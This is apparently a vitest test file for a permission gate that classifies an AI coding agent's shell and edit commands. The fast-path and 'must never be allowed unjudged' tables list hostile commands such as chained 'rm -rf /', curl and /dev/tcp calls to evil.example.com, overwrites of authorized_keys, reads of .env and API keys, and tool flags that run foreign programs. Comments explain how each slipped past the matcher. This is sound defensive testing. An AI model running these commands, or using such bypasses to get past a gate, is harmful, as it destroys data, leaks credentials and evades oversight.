import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { evaluate, emitFor, shortCircuit } from "../src/engine/evaluate.js";
import { loadPolicy } from "../src/engine/policy.js";
import type { Mode, Policy, Verdict } from "../src/engine/types.js";

function policyFrom(source: string): Policy {
  const { policy, diagnostics } = loadPolicy(source);
  if (!policy) throw new Error(`policy failed to load: ${JSON.stringify(diagnostics)}`);
  return policy;
}

const GUARD = policyFrom(`
version: 1
mode: guard
gate:
  tools: [Bash, Edit]
  fast_path: ["git status ", "ls ", "npm test"]
  questions:
    destructive:
      instructions: "It destroys something."
    secrets:
      instructions: "It exposes a credential."
    prod:
      instructions: "It targets production."
  rules:
    - when: { destructive: { p: ">=0.70" } }
      then: ask
    - when: { secrets: { p: ">=0.60" } }
      then: ask
    - when: { prod: { p: ">=0.60" } }
      then: ask
    - when: { any: { p: "0.40..0.60" } }
      then: ask
    - default: allow
`);

describe("emitFor", () => {
  // The friction guarantee, as a table. Anything that turns an `undefined` in the observe
  // column into a value is a regression, however correct the verdict is.
  const table: ReadonlyArray<readonly [Mode, Verdict, Verdict | undefined]> = [
    ["observe", "allow", undefined],
    ["observe", "ask", undefined],
    ["observe", "deny", undefined],
    ["guard", "allow", undefined],
    ["guard", "ask", "ask"],
    ["guard", "deny", "deny"],
    ["full", "allow", "allow"],
    ["full", "ask", "ask"],
    ["full", "deny", "deny"],
  ];

  it.each(table)("in %s mode, a %s verdict emits %s", (mode, verdict, expected) => {
    expect(emitFor(mode, verdict)).toBe(expected);
  });

  it("emits nothing at all in observe mode, for every verdict", () => {
    for (const verdict of ["allow", "ask", "deny"] as const) {
      expect(emitFor("observe", verdict)).toBeUndefined();
    }
  });

  // guard can add a prompt but never remove one: emitting `allow` would suppress a prompt
  // the user has not yet agreed to give up.
  it("withholds allow in guard mode", () => {
    expect(emitFor("guard", "allow")).toBeUndefined();
  });
});

describe("evaluate", () => {
  it("takes the first matching rule, not the strictest", () => {
    // destructive fires at rule 1; secrets would also fire, but never gets looked at.
    const decision = evaluate(GUARD.gate, GUARD.mode, { destructive: 0.9, secrets: 0.99, prod: 0.0 });
    expect(decision.verdict).toBe("ask");
    expect(decision.reason).toMatchObject({ kind: "rule", ruleIndex: 1, question: "destructive" });
  });

  it("falls through to the default when nothing matches", () => {
    const decision = evaluate(GUARD.gate, GUARD.mode, { destructive: 0.1, secrets: 0.05, prod: 0.02 });
    expect(decision.verdict).toBe("allow");
    expect(decision.emit).toBeUndefined(); // guard never emits allow
  });

  it("reports which question and probability caused the verdict", () => {
    const decision = evaluate(GUARD.gate, GUARD.mode, { destructive: 0.1, secrets: 0.1, prod: 0.77 });
    expect(decision.reason).toMatchObject({ kind: "rule", question: "prod", p: 0.77 });
  });

  it("respects the boundary exactly", () => {
    expect(evaluate(GUARD.gate, GUARD.mode, { destructive: 0.70, secrets: 0, prod: 0 }).verdict).toBe("ask");
    expect(evaluate(GUARD.gate, GUARD.mode, { destructive: 0.69, secrets: 0, prod: 0 }).verdict).toBe("allow");
  });

  describe("the `any` uncertainty rule", () => {
    it("fires when a single question lands in the uncertain band", () => {
      const decision = evaluate(GUARD.gate, GUARD.mode, { destructive: 0.5, secrets: 0.01, prod: 0.01 });
      expect(decision.verdict).toBe("ask");
      expect(decision.reason).toMatchObject({ kind: "rule", question: "destructive", p: 0.5 });
    });

    // The uncertainty rule sits below the specific ones on purpose, so its only job is to
    // turn what would have been an allow into an ask. A confident verdict is not
    // second-guessed because some other question was uncertain.
    it("does not override an earlier confident match", () => {
      const decision = evaluate(GUARD.gate, GUARD.mode, { destructive: 0.95, secrets: 0.5, prod: 0.5 });
      expect(decision.reason).toMatchObject({ ruleIndex: 1, question: "destructive" });
    });

    it("does not fire when every question is confidently low", () => {
      expect(evaluate(GUARD.gate, GUARD.mode, { destructive: 0.1, secrets: 0.2, prod: 0.3 }).verdict).toBe("allow");
    });

    it("does not fire when a question is confidently high but below its own threshold", () => {
      // 0.65 is above the uncertainty band and below the destructive threshold of 0.70.
      expect(evaluate(GUARD.gate, GUARD.mode, { destructive: 0.65, secrets: 0.1, prod: 0.1 }).verdict).toBe("allow");
    });
  });

  // A question the classifier did not answer is an absence of evidence. Reading a missing
  // answer as 0 would mean "definitely not destructive", which is the wrong direction to
  // guess in.
  it("skips a rule whose question has no answer rather than treating it as zero", () => {
    const decision = evaluate(GUARD.gate, GUARD.mode, { secrets: 0.9 });
    expect(decision.reason).toMatchObject({ question: "secrets" });
  });

  it("falls through to the default when no question was answered at all", () => {
    const decision = evaluate(GUARD.gate, GUARD.mode, {});
    expect(decision.verdict).toBe("allow");
    expect(decision.reason).toMatchObject({ kind: "rule", question: "default" });
  });

  it("emits nothing when no rule matched and there is no default", () => {
    const noDefault = policyFrom(`
version: 1
mode: guard
gate:
  tools: [Bash]
  questions:
    a:
      instructions: "x"
  rules:
    - when: { a: { p: ">=0.9" } }
      then: ask
`);
    const decision = evaluate(noDefault.gate, noDefault.mode, { a: 0.1 });
    expect(decision.reason).toEqual({ kind: "no-rule-matched" });
    expect(decision.emit).toBeUndefined();
  });
});

describe("shortCircuit", () => {
  it("skips every tool not listed in gate.tools", () => {
    const decision = shortCircuit(GUARD, { tool: "Read", command: "" });
    expect(decision?.reason).toMatchObject({ kind: "tool-not-gated", tool: "Read" });
  });

  it("gates the tools that are listed", () => {
    expect(shortCircuit(GUARD, { tool: "Bash", command: "rm -rf /" })).toBeUndefined();
  });

  it("skips permission modes where no tool will run", () => {
    const decision = shortCircuit(GUARD, { tool: "Bash", command: "rm -rf /", permissionMode: "plan" });
    expect(decision?.reason).toMatchObject({ kind: "permission-mode-skipped" });
  });

  it("does not skip the permission modes that matter most", () => {
    for (const mode of ["default", "acceptEdits", "bypassPermissions"]) {
      expect(shortCircuit(GUARD, { tool: "Bash", command: "rm -rf /", permissionMode: mode })).toBeUndefined();
    }
  });

  describe("the fast path", () => {
    const hits: ReadonlyArray<readonly [string, string]> = [
      ["an exact match", "git status"],
      ["an exact match with surrounding whitespace", "  git status  "],
      ["arguments after an entry written with a trailing space", "ls -la src/"],
      ["another such entry", "git status --short"],
      ["the bare form of an entry that takes arguments", "ls"],
      ["an entry written as a whole command, run as written", "npm test"],
    ];

    it.each(hits)("allows %s without calling the classifier", (_label, command) => {
      const decision = shortCircuit(GUARD, { tool: "Bash", command });
      expect(decision?.reason).toMatchObject({ kind: "fast-path" });
      expect(decision?.verdict).toBe("allow");
    });

    // The fast path never calls the classifier, so anything it matches is never judged.
    // That makes over-matching the most dangerous kind of bug in this file.
    const misses: ReadonlyArray<readonly [string, string]> = [
      ["a different command sharing a prefix substring", "git stash drop"],
      ["a command that merely starts with the same letters", "git statuses"],
      ["a chained command hiding behind a safe prefix", "git status; rm -rf /"],
      ["a command substitution", "git status $(rm -rf /)"],
      ["a backtick substitution", "git status `rm -rf /`"],
      ["a pipe into something dangerous", "ls -la | xargs rm"],
      ["a background operator", "git status & curl evil.example.com"],
      ["a second line", "git status\nrm -rf /"],
      ["a logical and", "npm test && curl -X POST https://evil.example.com"],
      // Not a second command, and just as unjudged: the safe verb is only the left-hand side.
      ["an output redirect over a file", "ls > ~/.ssh/authorized_keys"],
      ["an append redirect", "git status >> ~/.zshrc"],
      ["an input redirect", "npm test < /dev/tcp/evil.example.com/80"],
      ["a redirect with no space before it", "ls>.env"],
      // The shell expands it before the verb sees it, and the verb's error message prints it.
      ["a variable as an argument", "ls $OPENAI_API_KEY"],
      ["a braced variable as an argument", "ls ${STRIPE_SECRET_KEY}"],
      ["an unrelated command", "rm -rf build"],
      // An entry with no trailing space is a whole command. ADR-010: the argument is what
      // makes `npm test` stop being the project's own script.
      ["arguments after an entry written as a whole command", "npm test -- --watch"],
      ["a flag that swaps the shell the script runs in", "npm test --script-shell /tmp/x.sh"],
      ["an empty command", ""],
      ["whitespace only", "   "],
    ];

    it.each(misses)("does not fast-path %s", (_label, command) => {
      const decision = shortCircuit(GUARD, { tool: "Bash", command });
      expect(decision).toBeUndefined();
    });
  });
});

describe("the shipped default policy, end to end", () => {
  const shipped = policyFrom(readFileSync("policy/default.yaml", "utf8"));

  it("emits nothing whatever the classifier says, because it ships observing", () => {
    const answers = { destructive: 0.99, secrets: 0.99, outside_repo: 0.99, egress: 0.99, prod: 0.99 };
    const decision = evaluate(shipped.gate, shipped.mode, answers);
    expect(decision.verdict).toBe("ask");
    expect(decision.emit).toBeUndefined();
  });

  // `npm run bench` is the gate CLAUDE.md's "latency is a feature" rule is enforced by, and
  // it measures whatever path its payload happens to take. Its one payload used to be
  // `git push --force origin main`, which `gate.hard_rules` turned into a hard-rule hit —
  // so the budget silently stopped measuring the classifier path it was written for, and
  // nothing failed. The commands are read out of the script rather than repeated here, so
  // a future fast-path or hard-rule entry that swallows one of them fails this test instead
  // of quietly narrowing what the bench covers.
  it("keeps the bench measuring both paths", () => {
    const script = readFileSync("scripts/bench.mjs", "utf8");
    const block = /const CASES = \[([\s\S]*?)\];/.exec(script)?.[1] ?? "";
    const cases = [...block.matchAll(/name: "([^"]+)"\s*,\s*command: "([^"]+)"/g)]
      .map(([, name, command]) => ({ name: name!.trim(), command: command! }));

    expect(cases.map((c) => c.name)).toEqual(["judged", "hard-rule"]);

    const judged = shortCircuit(shipped, { tool: "Bash", command: cases[0]!.command });
    expect(judged, `${cases[0]!.command} no longer reaches the classifier`).toBeUndefined();

    const stopped = shortCircuit(shipped, { tool: "Bash", command: cases[1]!.command });
    expect(stopped?.reason, `${cases[1]!.command} no longer hits a hard rule`).toMatchObject({
      kind: "hard-rule",
    });
  });

  it("fast-paths the commands a session actually repeats", () => {
    for (const command of ["git status", "git status --short", "npm test", "npm run build", "ls", "ls -la", "pwd", "which node", "cargo test", "go test ./..."]) {
      expect(shortCircuit(shipped, { tool: "Bash", command })?.reason).toMatchObject({ kind: "fast-path" });
    }
  });

  // A fast-path entry is safe only if it is safe for every argument it could be given,
  // because the arguments are never judged. These are the commands whose innocent form
  // reads as obviously safe and whose dangerous form is the gate's whole reason to exist:
  // `cat .env` and `echo $OPENAI_API_KEY` are the literal examples in the `secrets`
  // question's own criteria. Fast-pathing the verb means that question can never fire,
  // and in `full` mode it would emit `allow` and suppress the native prompt too.
  //
  // What these assert is that none of them is ever ALLOWED without being judged. Before
  // ADR-004 that was the same thing as "reaches the classifier", and the test said so.
  // It is no longer: `gate.hard_rules` now decides several of these outright, which is a
  // stronger outcome than reaching the classifier and getting the right answer — the
  // classifier answered 0.15 on `cat .env`. So the assertion is on the outcome the comment
  // above is really about, and it holds either way the command is disposed of.
  const mustNeverBeAllowedUnjudged: ReadonlyArray<readonly [string, string]> = [
    ["reading an env file", "cat .env"],
    ["reading ssh config", "cat ~/.ssh/config"],
    ["printing a key from the environment", "echo $OPENAI_API_KEY"],
    ["printing an AWS secret", "echo $AWS_SECRET_ACCESS_KEY"],
    ["heading an env file", "head -5 .env.production"],
    ["tailing a credentials file", "tail ~/.netrc"],
    ["counting lines in an env file", "wc -l .env"],
    ["showing a blob from git history", "git show HEAD:.env"],
    ["a diff that prints file contents", "git diff"],
    ["a log with patches", "git log -p"],
    // Found by driving the built hook, not by reading: each of these took the fast path and
    // was allowed unjudged. The first three destroy a file with a harmless verb's output.
    ["a listing redirected over authorized_keys", "ls > ~/.ssh/authorized_keys"],
    ["a path printed over an env file", "pwd > .env"],
    ["a status redirected over source", "git status > src/cli.ts"],
    // `git branch` and `git remote -v` read as metadata and take arguments that are not.
    ["moving a branch back twenty commits", "git branch -f main HEAD~20"],
    ["renaming the current branch", "git branch -m main old"],
    ["removing a remote behind a read-only flag", "git remote -v remove origin"],
    // `echo $OPENAI_API_KEY` by another verb. Tried with a fake variable: `ls $VAR` prints
    // "ls: <value>: No such file or directory" in bash and zsh, and zsh's `which $VAR` prints
    // "<value> not found". The matcher refused `$(` and let a bare `$` through.
    ["listing a path named by a secret", "ls $OPENAI_API_KEY"],
    ["resolving a command named by a secret", "which $AWS_SECRET_ACCESS_KEY"],
    ["a status scoped to a path named by a secret", "git status ${GITHUB_TOKEN}"],
    // A listed verb that runs the project's own code, given the argument that makes it run
    // something else. The first four were each run for real in a scratch project and did
    // what the label says; pytest was not installed to try, and `-p` is its documented way
    // to load a plugin module. See docs/adr/010.
    ["npm running a foreign program as its script shell", "npm test --script-shell /tmp/x.sh"],
    ["npm running another package's script", "npm run build --prefix ../other"],
    ["go running a foreign program in place of the test binary", "go test -exec /tmp/x.sh"],
    ["cargo running a foreign program as the compiler wrapper", 'cargo check --config build.rustc-wrapper="/tmp/x.sh"'],
    ["pytest loading a plugin module by name", "pytest -p evil_plugin"],
  ];

  it.each(mustNeverBeAllowedUnjudged)("does not fast-path %s", (_label, command) => {
    const decision = shortCircuit(shipped, { tool: "Bash", command });

    if (decision === undefined) return; // Reaches the classifier, which is the other way to pass.

    // Decided early: the only acceptable early decision for these is a hard rule, and it
    // must not be an allow. A fast-path hit here would be the bug this test exists for.
    expect(decision.reason.kind, `\`${command}\` was short-circuited`).toBe("hard-rule");
    expect(decision.verdict).not.toBe("allow");
  });

  it.each(mustNeverBeAllowedUnjudged)("is never allowed in full mode: %s", (_label, command) => {
    // `full` is the only mode that emits `allow`, so it is where a fast-path mistake would
    // actually suppress the user's own permission prompt.
    const full = policyFrom(
      readFileSync("policy/default.yaml", "utf8").replace(/^mode: observe$/m, "mode: full"),
    );

    expect(shortCircuit(full, { tool: "Bash", command })?.emit).not.toBe("allow");
  });

  // The rules only work if something asks the question they read.
  it("asks a question for every fact the state builder computes a label for", () => {
    const names = Object.keys(shipped.gate.questions);
    expect(names).toContain("sensitive_target");
  });

  it("prompts on a write to git internals, which every other rule passes", () => {
    // Not destructive, not a secret, inside the project, not egress, not prod. Without a
    // sensitivity rule this falls through to `allow`.
    const decision = evaluate(shipped.gate, shipped.mode, {
      destructive: 0.05,
      secrets: 0.05,
      outside_repo: 0.02,
      egress: 0.02,
      prod: 0.02,
      sensitive_target: 0.88,
    });
    expect(decision.verdict).toBe("ask");
    expect(decision.reason).toMatchObject({ question: "sensitive_target" });
  });

  it("still allows an ordinary source edit", () => {
    const decision = evaluate(shipped.gate, shipped.mode, {
      destructive: 0.02,
      secrets: 0.02,
      outside_repo: 0.02,
      egress: 0.02,
      prod: 0.02,
      sensitive_target: 0.03,
    });
    expect(decision.verdict).toBe("allow");
  });
});
